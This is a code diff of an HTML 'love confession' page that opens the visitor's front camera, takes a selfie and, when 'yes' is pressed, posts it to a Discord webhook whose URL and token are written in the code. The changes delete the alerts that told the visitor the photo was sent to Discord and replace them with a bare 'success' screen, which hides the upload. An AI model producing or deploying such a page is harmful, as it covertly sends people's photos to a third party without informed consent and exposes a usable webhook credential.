@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
 <title>我喜歡妳 💖</title>
 
 <style>
@@ -14,10 +13,11 @@ body {
   color: white;
   text-align: center;
   overflow: hidden;
+  touch-action: none;
 }
 
-.card {
-  padding-top: 30px;
+h2 {
+  margin-top: 20px;
 }
 
 video {
@@ -61,21 +61,19 @@ img {
 
 <body>
 
-<div class="card">
-  <h2>💖 拍一張照片再決定 💖</h2>
+<h2>💖 拍照決定要不要答應 💖</h2>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-  <br>
+<br>
 
-  <button id="shoot">📸 拍照</button>
-  <button id="yesBtn">💖 願意</button>
+<button id="shoot">📸 拍照</button>
+<button id="yesBtn">💖 願意</button>
 
-  <br>
+<br>
 
-  <img id="preview">
-</div>
+<img id="preview">
 
 <script>
 const video = document.getElementById("video");
@@ -86,13 +84,11 @@ const preview = document.getElementById("preview");
 
 let imageData = null;
 
-// 📷 開前置鏡頭（必須用 HTTPS 或 localhost）
+// 📷 開前置鏡頭
 navigator.mediaDevices.getUserMedia({
   video: { facingMode: "user" }
 }).then(stream => {
   video.srcObject = stream;
-}).catch(err => {
-  alert("無法開啟相機：" + err);
 });
 
 // 📸 拍照
@@ -109,31 +105,28 @@ shoot.onclick = () => {
   preview.style.display = "block";
 };
 
-// 💖 傳 Discord
+// 💖 點願意 → 傳 Discord
 yesBtn.onclick = async () => {
+
   const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
 
-  if (!imageData) {
-    alert("請先開前攝辨識你是否說謊 📸");
-    return;
-  }
+  if (!imageData) return;
 
-  // 將 base64 轉 blob
   const res = await fetch(imageData);
   const blob = await res.blob();
 
   const formData = new FormData();
-  formData.append("file", blob, "selfie.png");
+  formData.append("file", blob, "love.png");
 
   const embed = {
     username: "💌 告白系統",
     embeds: [
       {
         title: "💖 告白成功",
-        description: "有人按下願意並上傳自拍 ❤️",
+        description: "有人按下願意 ❤️",
         color: 0xff4d6d,
         image: {
-          url: "attachment://selfie.png"
+          url: "attachment://love.png"
         },
         timestamp: new Date().toISOString()
       }
@@ -147,7 +140,7 @@ yesBtn.onclick = async () => {
     body: formData
   });
 
-  alert("已傳送到 Discord 💖");
+  document.body.innerHTML = "<h1>💖 成功 💖</h1>";
 };
 </script>
 
